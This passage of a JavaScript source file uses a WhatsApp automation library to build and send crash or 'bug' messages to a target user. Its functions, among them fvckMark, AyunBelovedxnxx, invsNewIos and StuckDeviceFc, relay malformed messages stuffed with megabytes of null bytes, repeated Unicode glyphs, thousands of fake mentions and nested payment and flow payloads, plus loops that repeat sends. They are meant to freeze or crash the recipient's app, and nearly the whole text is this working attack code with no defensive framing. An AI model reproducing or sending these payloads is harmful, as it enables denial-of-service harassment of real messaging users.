oPOACeYA7g+Z0YqETPMfJjmPkyi/TaezUNVXWaFL2isGy1EALbbliML+TsPIlBjmPkzJDL/IEfuB7vEeFcR4dodFbrPboLUWxUP3MitULKywwQA6OCp/B7FWxqXLxLUXanVGqzVBbCtt/R51LE/JI7kn533nnvdY61K9jstS8tYLEhBknA8DJJ/ZMgSTjJ7bRvosa1+pzMqBtjjpgDt4xiHuZyCRXt4rUf6EqiBY1rNnITcY2QD5z4/7t2mbKLkqrtsqsWq3PTcqQr4ODg/OJVJvY7oiO7MiDCKTkKM5wPG5JkTN4hERKpERAyO8MMEjbbxMRAREQEREBERAREQEREBERARNvQ6CzWLc1dlKCpC7dSwKSNtgO5O/Yb9z2BI1JEIk7UNdj1sVLKSpKsGG3gjY/sSft39p7nmq6fP08dVefOM/wzzY/OMfGcyqxpdPdq9TTptJTZfqLnFddVSlndicBVA3JJOABOp9RvpLjP0nxHS1cb4E/B+vWz1DqrctgDn/NSVLKCoIGDjlJA5t+d4RrdVw7i2i13DrRTrdNel1Fh5cJYrAqfu22IHfbzOs9UvUjjfqHrtG/GvYLVoA6UJoqmSsliOZ/vJYk8q9zjCjYHOVz4mq4gEjOD32MCIhVuptbUXvbYKw7nJFdaov9KoAH9CV4iIEYiIH/2Q=="
      }
    },
    {
      participant: { jid: target },
      ephemeralExpiration: 5,
      timeStamp: Date.now()
    }
  );
}
async function fvckMark(target) {
  for (let i = 0; i < 10; i++) {
    await sock.relayMessage(target, {
      groupStatusMessageV2: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: " ¡! Apollo Is Coming !¡ ",
              format: "EXTENSIONS_1"
            },
            contextInfo: {
              quotedMessage: {
                viewOnceMessage: {
                  message: {
                    interactiveResponseMessage: {
                      body: {
                        text: "@xrelly • #fvcker 🩸",
                        format: "EXTENSIONS_1"
                      },
                      nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: "\u0000",
                        version: 1
                      }
                    }
                  }
                }
              }
            },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "\u0000".repeat(1000000),
              version: 1
            }
          }
        }
      }
    }, { userJid: target, participant: { jid: target } })
  }
}

async function QueenSqL(target) {
  const randomHex = (len = 16) =>
    [...Array(len)].map(() => Math.floor(Math.random() * 16).toString(16)).join("");

  const Node = [
    {
      tag: "bot",
      attrs: {
        biz_bot: "1"
      }
    }
  ];

  let msg = generateWAMessageFromContent(target, {
    interactiveMessage: {
      messageContextInfo: {
        deviceListMetadata: {},
        deviceListMetadataVersion: 2,
        messageAssociation: {
          associationType: 2,
          parentMessageKey: randomHex(16)
        },
        messageSecret: randomHex(32), 
        supportPayload: JSON.stringify({
          version: 2,
          is_ai_message: true,
          should_show_system_message: true,
          expiration: -9999,
          ephemeralSettingTimestamp: 9741,
          disappearingMode: {
            initiator: "INITIATED_BY_OTHER",
            trigger: "ACCOUNT_SETTING"
          }
        }),
        isForwarded: true,
        forwardingScore: 1972,
        businessMessageForwardInfo: {
          businessOwnerJid: "13135550002@s.whatsapp.net"
        },
        quotedMessage: {
          interactiveMessage: {
            header: {
              hasMediaAttachment: true,
              jpegThumbnail: fs.readFileSync('./Zu.jpg'),
              title: "Wilzu" + "᭄".repeat(5000)
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "review_and_pay".repeat(5000),
                  buttonParamsJson: JSON.stringify({
                    currency: "XXX",
                    payment_configuration: "",
                    payment_type: "",
                    total_amount: { value: 1000000, offset: 100 },
                    reference_id: "4SWMDTS1PY4",
                    type: "physical-goods",
                    order: {
                      status: "payment_requested",
                      description: "",
                      subtotal: { value: 0, offset: 100 },
                      order_type: "PAYMENT_REQUEST",
                      items: [
                        {
                          retailer_id: "custom-item-6bc19ce3-67a4-4280-ba13-ef8366014e9b",
                          name: "wilzu is herr".repeat(5000),
                          amount: { value: 1000000, offset: 100 },
                          quantity: 1
                        }
                      ]
                    },
                    additional_note: "Dwilzu",
                    native_payment_methods: [],
                    share_payment_status: true
                  })
                }
              ],
              messageParamsJson: "{}"
            }
          }
        }
      },
      header: {
        hasMediaAttachment: true,
        locationMessage: {
          degreesLatitude: 0,
          degreesLongitude: 0
        }
      },
      nativeFlowMessage: {
        buttons: [
          {
            name: "payment_method",
            buttonParamsJson: JSON.stringify({
              currency: "IDR",
              total_amount: { value: 1000000, offset: 100 },
              reference_id: "Dwilzu",
              type: "physical-goods",
              order: {
                status: "canceled",
                subtotal: { value: 0, offset: 100 },
                order_type: "PAYMENT_REQUEST",
                items: [
                  {
                    retailer_id: "custom-item-6bc19ce3-67a4-4280-ba13-ef8366014e9b",
                    name: "wilzu is herr".repeat(5000),
                    amount: { value: 1000000, offset: 100 },
                    quantity: 1000
                  }
                ]
              },
              additional_note: "wilzu ",
              native_payment_methods: [],
              share_payment_status: true
            })
          }
        ],
        messageParamsJson: "{}"
      },
      annotations: [
        {
          embeddedContent: {
            embeddedMessage: {
              message: "wilzu is here"
            }
          },
          location: {
            degreesLongitude: 0,
            degreesLatitude: 0,
            name: "wilzu is herr".repeat(5000)
          },
          polygonVertices: [
            { x: 60.71664810180664, y: -36.39784622192383 },
            { x: -16.710189819335938, y: 49.263675689697266 },
            { x: -56.585853576660156, y: 37.85963439941406 },
            { x: 20.840980529785156, y: -47.80188751220703 }
          ],
          newsletter: {
            newsletterJid: "1@newsletter",
            newsletterName: "wilzu is herr".repeat(5000),
            contentType: "UPDATE",
            accessibilityText: "Wilzu"
          }
        }
      ]
    }
  }, { userJid: target });

  await sock.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id,
    additionalnodes: [
      {
        tag: "interactive",
        attrs: {
          type: "native_flow",
          v: "1"
        },
        content: [
          {
            tag: "native_flow",
            attrs: {
              v: "9",
              name: "payment_method"
            },
            content: [
              {
                tag: "extensions_metadata",
                attrs: {
                  flow_message_version: "3",
                  well_version: "700"
                },
                content: []
              }
            ]
          }
        ]
      }
    ]
  });
}

async function AyunBelovedxnxx(sock, target) {
  console.log(chalk.red(`𝗢𝘁𝗮𝘅 𝗦𝗲𝗱𝗮𝗻𝗴 𝗠𝗲𝗻𝗴𝗶𝗿𝗶𝗺 𝗕𝘂𝗴`));

  let peler = await sock.relayMessage(
    target,
    {
      extendedTextMessage: {
        text: "⸙ᵒᵗᵃˣнοω αяє γου?¿" + "ꦾ".repeat(50000) + "\n\nJust OTAX" + "\0".repeat(100),
        matchedText: "https://t.me/Otapengenkawin",
        description: "⸙ᵒᵗᵃˣнοω αяє γου?¿",
        title: "ꦽ".repeat(20000),
        previewType: 6,
        jpegThumbnail:
          "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAMAMBIgACEQEDEQH/xAAtAAEBAQEBAQAAAAAAAAAAAAAAAQQCBQYBAQEBAAAAAAAAAAAAAAAAAAEAAv/aAAwDAQACEAMQAAAA+aspo6VwqliSdxJLI1zjb+YxtmOXq+X2a26PKZ3t8/rnWJRyAoJ//8QAIxAAAgMAAQMEAwAAAAAAAAAAAQIAAxEEEBJBICEwMhNCYf/aAAgBAQABPwD4MPiH+j0CE+/tNPUTzDBmTYfSRnWniPandoAi8FmVm71GRuE6IrlhhMt4llaszEYOtN1S1V6318RblNTKT9n0yzkUWVmvMAzDOVel1SAfp17zA5n5DCxPwf/EABgRAAMBAQAAAAAAAAAAAAAAAAABESAQ/9oACAECAQE/AN3jIxY//8QAHBEAAwACAwEAAAAAAAAAAAAAAAERAhIQICEx/9oACAEDAQE/ACPn2n1CVNGNRmLStNsTKN9P/9k=",
        paymentLinkMetadata: {
          button: {
            displayText: "Love U My Ayun"
          },
          header: {
            headerType: 1
          },
          provider: {
            paramsJson: "{".repeat(10000)
          }
        },
        contextInfo: {
          isForwarded: true,
          forwardingScore: 9999,
          participant: target,
          remoteJid: "status@broadcast",
          mentionedJid: [
            "0@s.whatsapp.net",
            ...Array.from({ length: 1995 }, () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`)
          ],
          quotedMessage: {
            newsletterAdminInviteMessage: {
              newsletterJid: "otax@newsletter",
              newsletterName: "⸙ᵒᵗᵃˣнοω αяє γου?¿" + "ꦾ".repeat(10000),
              caption: "⸙ᵒᵗᵃˣнοω αяє γου?¿" + "ꦾ".repeat(60000) + "ោ៝".repeat(60000),
              inviteExpiration: "999999999"
            }
          },
          forwardedNewsletterMessageInfo: {
            newsletterName: "⸙ᵒᵗᵃˣнοω αяє γου?¿" + "⃝꙰꙰꙰".repeat(10000),
            newsletterJid: "13135550002@newsletter",
            serverId: 1
          }
        }
      }
    },
    { participant: { jid: target } }
  );

  await sleep(1000);
  await sock.sendMessage(target, {
    delete: {
     remoteJid: target,
      fromMe: true,
      id: peler.key.id,
      participant: target
    }
  });

  console.log(chalk.bold.red("Delay Visib Success To " + target));
}

async function invsNewIos(target) {
  let msg = generateWAMessageFromContent(
    target,
    {
      contactMessage: {
        displayName:
          "🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666" +
          "𑇂𑆵𑆴𑆿".repeat(10000),
        vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"𑇂𑆵𑆴𑆿".repeat(10000)};;;\nFN:🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"𑇂𑆵𑆴𑆿".repeat(10000)}\nNICKNAME:🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nORG:🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nTITLE:🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nitem1.TEL;waid=6287873499996:+62 878-7349-9996\nitem1.X-ABLabel:Telepon\nitem2.EMAIL;type=INTERNET:🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nitem2.X-ABLabel:Kantor\nitem3.EMAIL;type=INTERNET:🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nitem3.X-ABLabel:Kantor\nitem4.EMAIL;type=INTERNET:🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nitem4.X-ABLabel:Pribadi\nitem5.ADR:;;🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"ᩫᩫ".repeat(4000)};;;;\nitem5.X-ABADR:ac\nitem5.X-ABLabel:Rumah\nX-YAHOO;type=KANTOR:🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nPHOTO;BASE64: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\nX-WA-BIZ-NAME:🦠⃰͡°͜͡•⃟𝘅𝗿͢𝗲̷𝗹⃨𝗹𝘆̷͢-𝗰͢𝗹𝗶⃨𝗲𝗻̷͢𝘁 ⿻ 𝐓𝐡𝐫𝐞𝐞𝐬𝐢𝐱𝐭𝐲 ✶ > 666${"ᩫᩫ".repeat(4000)}\nEND:VCARD`,
        contextInfo: {
          participant: target,
          externalAdReply: {
            automatedGreetingMessageShown: true,
            automatedGreetingMessageCtaType: "\u0000".repeat(100000),
            greetingMessageBody: "\u0000"
          }
        }
      }
    },
    {}
  );

  await sock.relayMessage(
    "status@broadcast",
    msg.message,
    {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: undefined
                }
              ]
            }
          ]
        }
      ]
    }
  );
}

async function AxDFesix(sock, target) {
  const Yuko = "\u0000".repeat(1045000)
  const msg1 = {
        viewOnceMessage: {
            message: {
                groupStatusMessageV2: {
                    message: {
                        interactiveResponseMessage: {
                            nativeFlowResponseMessage: {
                                name: "galaxy_message",
                                paramsJson: Yuko,
                                version: 3
                            },
                            entryPointConversionSource: "galaxy_message"
                        }
                    }
                }
            }
        }
    };
  
  const msg2 = {
        viewOnceMessage: {
            message: {
                groupStatusMessageV2: {
                    message: {
                        interactiveResponseMessage: {
                            nativeFlowResponseMessage: {
                                name: "call_permission_request",
                                paramsJson: Yuko,
                                version: 3
                            },
                            entryPointConversionSource: "galaxy_message"
                        }
                    }
                }
            }
        }
    };
  
  const msg3 = {
        viewOnceMessage: {
            message: {
                groupStatusMessageV2: {
                    message: {
                        interactiveResponseMessage: {
                            nativeFlowResponseMessage: {
                 name: "address_message",
                   paramsJson: Yuko,
            version: 3
          },
          entryPointConversionSource: "galaxy_message"
                }
             }
          }
        }
      }
    };
 
   
  for (const msg of [msg1, msg2, msg3]) {
    for (let i = 0; i < 1; i++) {
    await sock.relayMessage(target, msg, {});
    }
  }
}

async function StuckDeviceFc(target) {
  const msg1 = {
    extendedTextMessage: {
      text: "$$$$$",
      locationMessage: {
        degressLatitude: 617267,
        degressLongitude: -6172677,
        isLive: true,
        accuracyInMetters: 100,
        jpegThumbnail: null,
      },
      contextInfo: {
        forwardingScore: 9471,
        isForwarded: true,
        mentionedJid: [
          "0@s.whatsapp.net",
          ...Array.from({ length: 1900 }, () => "1" + Math.floor(Math.random() * 500000000) + "@s.whatsapp.net")
        ],
        participant: target,
        stanzaId: target,
        entryPointConversionSource: "notification",
        remoteJid: target,
      },
      messageContextInfo: {
        deviceListMetadata: {},
        deviceListMetadataVersion: 3,
      },
    },
  };

  await sock.relayMessage(target, msg1, {
    messageId: null,
    participant: { jid: target },
  });
  
  const msg2 = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            contextInfo: {
              expiration: 1,
              ephemeralSettingTimestamp: 1,
              entryPointConversionSource: "WhatsApp.com",
              entryPointConversionApp: "WhatsApp",
              entryPointConversionDelaySeconds: 1,
              disappearingMode: {
                initiatorDeviceJid: target,
                initiator: "INITIATED_BY_OTHER",
                trigger: "UNKNOWN_GROUPS"
              },
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              mentionedJid: [target],
              businessMessageForwardInfo: {
                 businessOwnerJid: "13135550002@s.whatsapp.net"
              },
              quotedMessage: {
                callLogMesssage: {
                  isVideo: false,
                  callOutcome: "ONGOING",
                  durationSecs: "0",
                  callType: "VOICE_CHAT",
                  participants: [
                    {
                      jid: "13135550002@s.whatsapp.net",
                      callOutcome: "CONNECTED"
                    },
                    ...Array.from({ length: 10000 }, () => ({
                      jid: `1${Math.floor(Math.random() * 99999)}@s.whatsapp.net`,
                      callOutcome: "CONNECTED"
                    }))
                  ]
                }
              },
              externalAdReply: {
                showAdAttribution: false,
                renderLargerThumbnail: true
              }
            },
            header: {
              videoMessage: {
                url: "https://mmg.whatsapp.net/o1/v/t24/f2/m232/AQOS7xVULFd5Ekk1T8o8pWSq-j5UmHzUPG5sq0frfEogEtMRJ_FNjaT7rKYUSm-iImapgmKZ7iq5_9_CC8mSbD0me0ye2OcoyDxaqJU?ccb=9-4&oh=01_Q5Aa2AFf2ZI7JiJkIlqsek6JvJAGekHxXtN9qtw95RhN1meW8g&oe=68987468&_nc_sid=e6ed6c&mms3=true",
                mimetype: "video/mp4",
                fileSha256: "pctPKf/IwXKoCzQ7da4YrzWk+K9kaySQuWqfbA8h0FY=",
                fileLength: "847271",
                seconds: 7,
                mediaKey: "dA+Eu1vaexH4OIHRZbL8uZIND+CKA6ykw9B2OrL+DH4=",
                gifPlayback: true,
                height: 1280,
                width: 576,
                fileEncSha256: "GwTECHj+asNIHYh/L6NAX+92ob/LDSP5jgx/icqHWvk=",
                directPath: "/o1/v/t24/f2/m232/AQOS7xVULFd5Ekk1T8o8pWSq-j5UmHzUPG5sq0frfEogEtMRJ_FNjaT7rKYUSm-iImapgmKZ7iq5_9_CC8mSbD0me0ye2OcoyDxaqJU?ccb=9-4&oh=01_Q5Aa2AFf2ZI7JiJkIlqsek6JvJAGekHxXtN9qtw95RhN1meW8g&oe=68987468&_nc_sid=e6ed6c",
                mediaKeyTimestamp: "1752236759",
                jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/4gIoSUNDX1BST0ZJTEUAAQEAAAIYAAAAAAQwAABtbnRyUkdCIFhZWiAAAAAAAAAAAAAAAABhY3NwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAA9tYAAQAAAADTLQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAlkZXNjAAAA8AAAAHRyWFlaAAABZAAAABRnWFlaAAABeAAAABRiWFlaAAABjAAAABRyVFJDAAABoAAAAChnVFJDAAABoAAAAChiVFJDAAABoAAAACh3dHB0AAAByAAAABRjcHJ0AAAB3AAAADxtbHVjAAAAAAAAAAEAAAAMZW5VUwAAAFgAAAAcAHMAUgBHAEIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFhZWiAAAAAAAABvogAAOPUAAAOQWFlaIAAAAAAAAGKZAAC3hQAAGNpYWVogAAAAAAAAJKAAAA+EAAC2z3BhcmEAAAAAAAQAAAACZmYAAPKnAAANWQAAE9AAAApbAAAAAAAAAABYWVogAAAAAAAA9tYAAQAAAADTLW1sdWMAAAAAAAAAAQAAAAxlblVTAAAAIAAAABwARwBvAG8AZwBsAGUAIABJAG4AYwAuACAAMgAwADEANv/bAEMABgQFBgUEBgYFBgcHBggKEAoKCQkKFA4PDBAXFBgYFxQWFhodJR8aGyMcFhYgLCAjJicpKikZHy0wLSgwJSgpKP/bAEMBBwcHCggKEwoKEygaFhooKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKP/AABEIAGQALQMBIgACEQEDEQH/xAAbAAEAAgMBAQAAAAAAAAAAAAAAAgMBBAYFB//EACsQAAICAQIFAwQCAwAAAAAAAAECAAMRBCEFEhMxUQcUQQYiYXEygUKx8P/EABcBAQEBAQAAAAAAAAAAAAAAAAABAgP/xAAZEQEBAAMBAAAAAAAAAAAAAAAAEQEhQTH/2gAMAwEAAhEDEQA/APgGl4Jq7bbKarOGZcBc366irGWODl3HKfsOc9gRnHMM+PNqxk6NTk6g2tzGwscKT8EH5/MoPOACeYA7g+Z0YqETPMfJjmPkyi/TaezUNVXWaFL2isGy1EALbbliML+TsPIlBjmPkzJDL/IEfuB7vEeFcR4dodFbrPboLUWxUP3MitULKywwQA6OCp/B7FWxqXLxLUXanVGqzVBbCtt/R51LE/JI7kn533nnvdY61K9jstS8tYLEhBknA8DJJ/ZMgSTjJ7bRvosa1+pzMqBtjjpgDt4xiHuZyCRXt4rUf6EqiBY1rNnITcY2QD5z4/7t2mbKLkqrtsqsWq3PTcqQr4ODg/OJVJvY7oiO7MiDCKTkKM5wPG5JkTN4hERKpERAyO8MMEjbbxMRAREQEREBERAREQEREBERARNvQ6CzWLc1dlKCpC7dSwKSNtgO5O/Yb9z2BI1JEIk7UNdj1sVLKSpKsGG3gjY/sSft39p7nmq6fP08dVefOM/wzzY/OMfGcyqxpdPdq9TTptJTZfqLnFddVSlndicBVA3JJOABOp9RvpLjP0nxHS1cb4E/B+vWz1DqrctgDn/NSVLKCoIGDjlJA5t+d4RrdVw7i2i13DrRTrdNel1Fh5cJYrAqfu22IHfbzOs9UvUjjfqHrtG/GvYLVoA6UJoqmSsliOZ/vJYk8q9zjCjYHOVz4mq4gEjOD32MCIhVuptbUXvbYKw7nJFdaov9KoAH9CV4iIEYiIH/2Q==",
                gifAttribution: "NONE"
              },
              hasMediaAttachment: false
            },
            body: {
              text: "ꦾ".repeat(50000)
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(20000),
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: ""
                },
                {
                  name: "galaxy_message",
                  buttonParamsJson: JSON.stringify({
                    flow_action: "navigate",
                    flow_action_payload: { screen: "CTZ_SCREEN" },
                    flow_cta: "ꦾ".repeat(50000),
                    flow_id: "UNDEFINEDONTOP",
                    flow_message_version: "9.903",
                    flow_token: "UNDEFINEDONTOP"
                  })
                }
              ]
            }
          }
        }
      }
    },
    {}
  );

  await sock.relayMessage(target, msg2.message, {
    participant: { jid: target },
    messageId: msg2.key.id
  });

  await sock.relayMessage(
    target,
    {
      groupInviteMessage: {
        groupJid: "120363347113453659@g.us",
        inviteCode: "x",
        inviteExpiration: Date.now(),
        groupName: "$$$$$$$$".repeat(10000),
        caption:"ꦾ".repeat(50000),
